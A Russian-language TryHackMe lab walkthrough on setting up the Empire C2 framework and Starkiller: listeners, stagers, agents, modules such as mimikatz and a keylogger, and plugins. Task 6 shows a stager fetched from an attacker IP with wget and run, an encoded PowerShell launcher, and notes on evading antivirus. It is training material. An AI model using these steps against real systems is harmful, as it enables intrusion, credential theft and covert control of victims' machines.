[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Empire](https://tryhackme.com/r/room/rppsempire) 

Всего 10 заданий:
## Задание 1
Empire, сервер C2 или Command and Control, созданный BC-Security, используемый для развертывания агентов на 
устройстве и удаленного запуска модулей. Empire — это бесплатная и открытая альтернатива другим серверам Command and 
Control, таким как известный Cobalt Strike C2 . В этой комнате мы рассмотрим основы настройки прослушивателя и 
стейджера, а также доступные типы, а затем узнаем, как использовать агента на устройстве.

Виртуальная машина, используемая в этой комнате, — Blue, созданная DarkStar7417. Вы можете загрузить ее для 
использования в автономном режиме здесь или развернуть на Tryhackme в Задаче 6.

Перед тем, как завершить эту комнату, мы рекомендуем завершить комнату ' What the Shell ' от MuirlandOracle  и '' 
Blue ' от DarkStar7471 . Если у вас есть общее представление об основных обратных оболочках и методах эксплуатации, 
то вы будете готовы начать.

Для получения дальнейших обновлений и комнат подписывайтесь на @DarkStar7471 и @Cryillic в Twitter.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и переходите к установке.
```commandline
Ответ не нужен
```

## Задание 2
Прежде чем мы сможем перейти к использованию Empire, нам необходимо развернуть машину для подключения к серверу Empire.

Разверните эту машину и выясните, к какому эксплойту она уязвима.  Виртуальная машина, используемая в этой комнате 
(синяя), может быть загружена для использования в автономном режиме с  https://darkstar7471.com/resources.html 

Мы рекомендуем завершить комнату « Синяя » перед этой комнатой исключительно для этой цели.

### Ответьте на вопросы ниже
Разверните эту машину и узнайте, к каким уязвимостям она восприимчива!
```commandline
Ответ не нужен
```
Воспользуйтесь уязвимостью и получите обратный шелл!
```commandline
Ответ не нужен
```

## Задание 3
Установка Empire и Starkiller очень проста и может быть выполнена из командной строки. Выбор за вами, хотите ли вы 
использовать GUI для Empire, сама комната будет демонстрировать Starkiller, но все функции те же. Для получения 
дополнительных инструкций по установке Empire обратитесь к BC-Security Github.  



Примечание: Starkiller — это графический интерфейс для Empire, он не обязателен, однако будет использоваться в этой 
комнате. 

Более подробную информацию об Empire можно найти в блоге BC-Security.

Примечание: Если вы используете Attackbox, прочтите инструкцию по использованию по адресу  `/root/Instructions/empire-starkiller.txt.`

#### Установка Империи

Мы можем начать с установки Empire на наше устройство. Следуйте инструкциям ниже, чтобы установить Empire.
```commandline
1.cd /opt
2. git clone https://github.com/BC-SECURITY/Empire/
3. cd /opt/Empire
4../setup/install.sh
```
#### Установка Старкиллера

После установки Empire мы можем установить графический интерфейс для Empire, известный как Starkiller.
```commandline
1.cd /opt
2. Загрузите актуальную версию Starkiller из репозитория BC-Security Github -  https://github.com/BC-SECURITY/Starkiller/releases 
3. chmod +x starkiller-0.0.0.AppImage
```

#### Начальная Империя

После установки Empire и Starkiller мы можем запустить оба сервера. Для этого запустите Empire, следуя инструкциям ниже.
```commandline
1.cd /opt/Empire
2../empire --rest
```

#### Запуск Старкиллера

После запуска Empire следуйте инструкциям ниже, чтобы запустить Starkiller.
```commandline
1.cd /opt
2. ./starkiller-0.0.0.AppImage
3. Войти в Starkiller
```


Учетные данные по умолчанию

	Uri: 127.0.0.1:1337
	User: empireadmin
	Pass: password123

После входа в Starkiller вас должно поприветствовать меню «Слушатели». Как только Starkiller или Empire будут готовы,
переходите к Заданию 3, чтобы ознакомиться с меню.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и установите Empire и Starkiller.

```commandline
Ответ не нужен
```

## Задание 4
Теперь, когда Empire и Starkiller установлены и запущены, мы можем провести краткий обзор графического интерфейса , 
чтобы увидеть некоторые из основных функций, которые может предложить Empire. Вы заметите шесть различных основных 
вкладок, с которыми вы будете взаимодействовать чаще всего, каждая из них описана ниже.  
- Прослушиватели — аналогичны Netcat или multi/handler для приема бэкстейджеров.
- Stagers — аналогичны полезной нагрузке с дополнительными функциями для развертывания агентов.
- Агенты — используются для взаимодействия с агентами на устройстве с целью выполнения «задач». 
- Модули — модули, которые можно использовать в качестве инструментов или эксплойтов.
- Учетные данные — сообщает обо всех учетных данных, найденных при использовании модулей.
- Отчетность — отчет по каждому модулю и команде, выполненной на каждом агенте.

#### Слушатели

Первое меню, которое вы увидите, — это меню слушателей. Это меню позволит вам создать и перечислить, какие слушатели 
у вас есть. Слушатели будут прослушивать определенный порт, подобно Netcat или multi handler.  

#### Стагеры

Stagers будут второй точкой для получения агента для обратного подключения к вашему серверу C2 . Это меню, похожее 
на меню слушателя, позволит вам создать и перечислить, какие stagers у вас есть в наличии. Stagers отправят агента, 
похожего на полезную нагрузку.  

#### Агенты 

Агенты будут тем местом, где вы будете выполнять большую часть взаимодействия в Starkiller. Это меню позволит вам 
увидеть обзор всех агентов и взаимодействовать с определенными агентами. Агенты подобны оболочкам для устройства, вы 
можете отправлять команды оболочки и модули от агентов.  

#### Модули

Меню Модули предоставит вам обзор всех доступных модулей и позволит вам искать определенный модуль. Модули — это 
специальные инструменты и эксплойты, которые можно использовать с такими агентами, как скрипты перечисления, методы 
повышения привилегий и эксплойты.   

#### Реквизиты для входа

Меню Credentials — очень полезное меню в Starkiller, которое сохранит любые перечисленные учетные данные, найденные 
на устройстве или модуле. Оно может сохранять хэши или открытые текстовые пароли; вы также можете вручную добавлять 
любые учетные данные, которые оно не собирает автоматически.  

#### Отчетность 

Меню «Отчеты» — еще одно полезное меню, позволяющее просматривать команды оболочки или модули, которые вы запускали 
в прошлом, и сообщать о них в этом меню, что очень удобно для анализа проделанной работы.  

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и ознакомьтесь с меню Starkiller.

```commandline
Ответ не нужен
```

## Задание 5
Обзор слушателей

Прослушиватели используются в Empire так же, как и в любом другом обычном прослушивателе, например Netcat и 
multi/handler. Эти прослушиватели могут иметь некоторые очень полезные функции, которые могут помочь в управлении 
агентами, а также в сокрытии вашего трафика / уклонении от обнаружения. Ниже вы можете найти обзор доступных 
прослушивателей и их использования.   

http — это стандартный прослушиватель, который использует HTTP для прослушивания определенного порта.
Следующие четыре команды используют вариации HTTP COM для генерации прослушивателя, это выходит за рамки данной темы;
однако я рекомендую вам провести собственное исследование HTTP COM и того, как их можно использовать для сокрытия 
трафика.  

- http_com — использует стандартный HTTP- прослушиватель с COM-объектом IE.
- http_foreign — используется для указания на другой сервер Empire.
- http_hop — используется для создания внешнего редиректора с помощью PHP .
- http_mapi — использует стандартный HTTP- прослушиватель с объектом MAPI COM.


Все следующие пять команд используют вариации встроенных служб или обладают уникальными функциями, которые отличают 
их от других слушателей. 
- meterpreter — используется для прослушивания стейджеров Metasploit .
- onedrive — использует OneDrive в качестве платформы для прослушивания.
- редиректор — используется для создания опорных точек в сети.
- dbx — использует Dropbox в качестве платформы прослушивания.
- http_malleable — используется вместе с адаптивными профилями C2 от BC-Security.


Также есть возможность создавать пользовательские податливые прослушиватели c2, которые действуют как маяки для 
эмуляции определенных угроз или APT, однако это выходит за рамки этой комнаты. Для получения дополнительной 
информации см. блог BC-Security .  

В этом разделе мы будем использовать HTTP- прослушиватель.

Создание прослушивателя

1. Перейдите на вкладку «Слушатели» и выберите «СОЗДАТЬ СЛУШАТЕЛЬ».
2. Выберите тип прослушивателя. Для демонстрации мы будем использовать HTTP- прослушиватель.
3. Настройте свой прослушиватель. Единственные два параметра, которые вам нужно будет изменить, — это IP-адрес хоста и порт хоста.

Меню для создания слушателя дает нам много вариантов выбора. Эти поля опций будут меняться от слушателя к слушателю. 
Ниже приведено описание каждого поля, присутствующего для слушателя HTTP, и того, как их можно использовать и 
настраивать.  

- Имя — укажите, под каким именем слушатель будет отображаться в меню слушателей.
- Хост — IP-адрес для обратного подключения.
- Порт — порт для прослушивания.
- BindIP — IP-адрес для привязки (обычно localhost / 0.0.0.0)
Эти параметры можно использовать для указания того, как работает прослушиватель при запуске и во время работы. 

- DefaultDelay
- По умолчанию Джиттер
- DefaultLostLimit

Следующие параметры могут быть полезны для обхода методов обнаружения и создания более сложных прослушивателей.
- DefaultProfile — позволит вам указать используемый профиль или User-Agent.
- Заголовки — поскольку это прослушиватель HTTP, он будет указывать заголовки HTTP .
- Launcher — какой launcher использовать для прослушивателя, это будет префиксом для stager.


4. После нажатия кнопки «Отправить» у нас теперь есть активный прослушиватель на порту 4444.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и создайте HTTP-прослушиватель. 

```commandline
Ответ не нужен
```

## Задание 6
#### Обзор Stagers

`Starkiller` использует слушателя и стейджера для создания агента, слушатель делает именно так, как он звучит, он 
прослушивает заданный порт для обратного соединения от вашего агента. Стейджер похож на полезную нагрузку или 
обратную оболочку, которую вы отправляете цели, чтобы получить агента обратно. Существует большое количество 
доступных стейджеров, мы рассмотрим только несколько стейджеров и их использование, а затем используем два, чтобы 
продемонстрировать их использование. Ниже приведено описание нескольких из возможного списка стейджеров, из которых 
можно выбрать.     

Empire имеет несколько частей для каждого этапа, чтобы помочь идентифицировать каждый из них. Во-первых, это 
платформа, которая может включать multi, OSx и Windows. Во-вторых, сам тип stager / launcher. 

Ниже приведены три стейджера общего назначения, которые можно использовать в качестве основных стейджеров. 
Multi/launcher — наиболее универсальный стейджер, который можно использовать для различных сценариев. Именно его мы 
будем использовать для демонстрационных целей в этой комнате.  

- multi/launcher — достаточно универсальный стейджер, который можно использовать для множества устройств.
- windows/launcher_bat — пакетный файл Windows
- multi/bash - Базовый Bash Stager


Вы также можете использовать stagers для более специфических приложений, похожих на listeners. Это может быть что 
угодно, от макрокода до ducky code для атак USB. 
- windows/ducky - скрипт Ducky для USB Rubber Ducky для физических атак на USB.
- windows/hta - сервер HTA , протокол HTML-приложений, который можно использовать для обхода AV .
- osx/applescript — Stager в AppleScript: собственном языке программирования Apple.
- osx/teensy — Похож на резиновую уточку, представляет собой микроконтроллер небольшого форм-фактора для физических 
  атак.

Каждый стейджер может иметь свои собственные применения и сильные стороны. Для этой комнаты мы будем использовать 
multi/launcher и windows/launcher_bat, чтобы продолжить по всей комнате. 

Создание Stager

1. Перейдите на вкладку Stagers и выберите «СОЗДАТЬ STAGER».
2.  Выберите тип вашего стейджера. Для нашей демонстрации мы будем использовать windows/launcher_bat.
3. Установите прослушиватель на тот, который вы создали в предыдущем задании.

Меню создания стейджера не имеет большого количества опций, но позволяет вам настраивать каждый стейджер по своему 
вкусу, с выбранным вами слушателем. Меню стейджера может содержать различные опции в зависимости от выбранного 
стейджера, а также необязательные поля.  

Прослушиватель — выберите прослушиватель, который будет использоваться, из списка созданных прослушивателей на сервере Empire.
Base64 — включение или отключение кодирования Stager с помощью base64.
Язык — язык, используемый для создания Stager: bash, PowerShell , Python и т. д.
SafeChecks — включение или отключение проверок для стейджера.
Я призываю вас изучить больше дополнительных полей; однако они выходят за рамки этой комнаты. Некоторые из 
дополнительных полей включают ASMIBypass, Obfuscate, ETWBypass и т. д. 



4.  Теперь у нас есть Stager, готовый к развертыванию на нашей целевой машине. В зависимости от выбранного вами типа 
    Stager вам придется либо загрузить, либо скопировать и вставить Stager на целевую машину. 

Передача и выполнение Stager
Атакующая машина:

Существует множество способов отправки Stager на целевую машину, включая SCP, фишинг и вредоносные 
программы-дропперы; в этом примере мы будем использовать базовый сервер python3 и wget для передачи Stager. 

1. `python3 -m http.server`

Целевая машина:
1. `wget TUN0_IP:8000/launcher.bat -outfile launcher.bat`
2. `)./launcher.bat`

Ниже показано, как будет выглядеть полезная нагрузка PowerShell multi/launcher с powershell -noP -sta -w 1 -enc 
launcher, который мы предоставили при создании слушателя. Launcher возьмет закодированную полезную нагрузку и 
декодирует ее, а затем запустит ее, в этом случае полезная нагрузка все равно будет обнаружена AV , однако вы можете 
настроить команды запуска и обфускации, чтобы обойти AV или другие обнаружения.   

После выполнения стейджера, если вы правильно настроили и стейджер, и прослушиватель, то агент выполнит проверку на 
вкладке агентов. 

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и создайте базовый multi/launcher stager, используя HTTP-прослушиватель, созданный вами в 
Задании 5. 
```commandline
Ответ не нужен
```
Запустите Stager на устройстве, которое вы развернули в Задаче 2. 

```commandline
Ответ не нужен
```

## Задание 7
Обзор агентов

Агенты используются в Starkiller аналогично тому, как вы взаимодействуете с обычной оболочкой или терминалом. Вы 
можете запускать команды оболочки, а также модули, которые поставляются предварительно упакованными с Empire. В 
отличие от обычной оболочки, с любым сервером C2, как только у вас есть агент, подключенный обратно к серверу C2, вы 
можете использовать любые модули и не активировать AV или другие обнаружения, поскольку они запускаются удаленно. 
Все агенты имеют одинаковую функциональность и доступные модули, стейджер и слушатель определяют только то, как 
агент отправляется на устройство и как он подключается обратно.     

Агенты имеют цветовую кодировку и используют значки, чтобы помочь отличить статус агента. Ниже приведена схема 
цветов и значков 

- Красный — пользователь больше не отвечает.
- Черный — пользователь реагирует нормально. 
- Значок пользователя — обычная учетная запись пользователя
- Значок пользователя с шестеренкой — учетная запись пользователя системы


Использование агентов

Ниже вы можете увидеть базовую схему меню взаимодействия с агентом и то, какими возможностями обладает агент на устройстве.

Основными функциями меню взаимодействия, которые вы будете использовать, снова являются команды оболочки и модули, 
но в меню есть и другие функции, такие как переименование агента, завершение работы агента и возможность настройки 
конкретных конфигураций агента на вкладке ВИД. Это выходит за рамки этой комнаты, но мы рекомендуем вам взглянуть и 
изучить это меню подробнее.   

Несмотря на то, что это компьютер с ОС Windows, Empire позволяет запускать на нем любые команды оболочки, такие как 
ls, whoami, ifconfig и т. д., что может быть полезно, если вам не знаком обычный синтаксис командной строки Windows. 

Все команды оболочки и модули при их запуске называются задачами в Empire, поскольку агент отправляется на 
устройство для выполнения задачи, а затем возвращается с выводом. 

В разделе «Выполнить модуль» будут отображаться выходные данные как команд оболочки, так и модулей.



Вывод покажет, какое имя пользователя на сервере C2 выполнило задачу, а затем вывод задачи. Отображение имени 
пользователя Empire перед задачей может быть очень полезным, поскольку Empire имеет возможность использовать 
несколько клиентов и пользователей, подключенных к одному серверу, для взаимодействия с одним агентом.  

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и переходите к использованию модулей с агентами.

```commandline
Ответ не нужен
```

## Задание 8
Обзор модуля

Модули используются в Empire как способ упаковки инструментов и эксплойтов для простого использования с агентами. 
Эти модули могут быть полезны для простой компиляции эксплойтов, использования инструментов и обхода антивируса. 
Empire имеет коллекцию модулей, а также возможность добавлять плагины, которые действуют как модули, о чем мы 
поговорим далее в следующей задаче.   

Ниже мы рассмотрим несколько полезных примеров перечисления и повышения привилегий:
- Ремень безопасности
- Мимикац 
- WinPEAS
и т. д.

Empire сортирует модули по используемому языку: PowerShell, Python, внешние и эксфильтрационные, а также по 
категориям модулей, которые вы можете найти ниже. 
- выполнение кода
- коллекция
- реквизиты для входа
- эксфильтрация
- эксплуатация
- боковое движение
- управление
- упорство 
- privesc
- разведка
- ситуационная осведомленность 
- trollsploit

Empire классифицирует модули на основе MITRE ATT&CK и предоставляет методы, используемые для каждого модуля в 
соглашении об именовании ATT&CK, например T1552. Для получения дополнительной информации об ATT&CK посетите 
страницу MITRE или комнату Tryhackme MITRE.  

Использование модулей

Использование модулей довольно просто, вы можете открыть меню взаимодействия с пользователем и найти нужный вам 
модуль. После того, как у вас есть нужный вам модуль, некоторые из них требуют ввода некоторых данных, таких как 
команда для запуска, слушатель и т. д., а другие можно просто запустить прямо из коробки   

Ниже вы можете увидеть, как мы запускаем модуль Seatbelt, для модуля не требуется никакой конфигурации, вы просто 
выбираете модуль, а затем запускаете его. Если вам нужен больший контроль над модулями, вы можете выбрать 
раскрывающийся список Optional Fields и иметь другие параметры, которые вы можете настроить, например, указав 
команду в Seatbelt для запуска.   

Ниже вы можете видеть, как назначается задача запуска Seatbelt, а затем вывод модуля выводится в окно консоли.


Поскольку все модули запускаются удаленно из задачи и агента, это означает, что нам не нужно беспокоиться об 
антивирусе или других возможных обнаружениях.  

Мы можем взглянуть на другие модули, чтобы увидеть больше возможностей модулей Empire. Ниже вы можете увидеть вывод 
для WinPEAS, скрипта, изначально из Privilege Escalation Awesome Scripts Suite, затем перенесенного в Empire. 


На снимке экрана выше показана только основная системная информация из выходных данных WinPEAS, но выходные данные 
модуля могут предоставить вам другую очень важную информацию относительно векторов повышения привилегий. 

### Ответьте на вопросы ниже
Какой модуль позволяет использовать любую команду mimikatz?
```commandline
powershell/credentials/mimikatz/command
```
Какая техника MITRE ATT&CK связана с powershell/trollsploit/voicetroll?
```commandline
T1491
```
Какой модуль внедряет кейлоггер в устройство?
```commandline
powershell/collection/keylogger
```
Какая техника MITRE ATT&CK связана с модулем выше?
```commandline
T1056
```
Прочитайте вышеизложенное и переходите к использованию плагинов для создания пользовательских модулей.
```commandline
Ответ не нужен
```

## Задание 9
Обзор плагинов

Плагины — это расширение базового набора модулей, с которыми поставляется Empire. Вы можете легко загрузить и 
использовать плагины, созданные сообществом, чтобы расширить возможности использования Empire. 

Чтобы использовать плагин, перенесите файл plugin.py в каталог /plugins Empire. В качестве примера использования 
плагинов мы будем использовать плагин socks-сервера, созданный BC-Security, вы можете скачать его здесь . 


Использование плагинов

Перенесите или клонируйте плагин, который вы хотите использовать, в каталог плагинов Empire.


После версии Empire 3.4.0 Empire автоматически загружает плагины на сервер. Если плагин еще не запущен, вы можете 
использовать команду plugin, чтобы загрузить плагин для использования.  

Синтаксис:plugin <plugin name>

Вы можете запускать плагины с помощью команд start и stop. В зависимости от плагина флаги/параметры могут меняться 
для каждого. 

Синтаксис:start <plugin name>

Синтаксис:stop <plugin name>

Использование плагинов работает по-разному для каждого плагина. Плагин сервера socks использует команду запуска и 
остановки вместе с именем плагина для запуска нового прокси-сервера, аналогично размещению прокси непосредственно на 
хосте, но плагины напрямую содержатся в Empire.  

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и попробуйте использовать плагин с Empire.
```commandline
Ответ не нужен
```

## Задание 10
Хотите узнать больше? Блог BC-Security может стать отличным местом для начала изучения более продвинутых методов 
работы с Empire. BC-Security также проводит периодические веб-трансляции или онлайн-курсы, которые могут быть более 
углубленными. Для получения дополнительной информации посетите веб-сайт BC-Security.

Если вы используете Empire, вы можете использовать его вместо Netcat или других обратных оболочек при завершении комнат.

Если вы хотите продолжить работу над своими методами эксплуатации Empire на Tryhackme, ознакомьтесь с разделом 
ПЕРЕХВАТ DLL. 

### Ответьте на вопросы ниже
Ознакомьтесь с предоставленными ссылками и продолжайте обучение!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)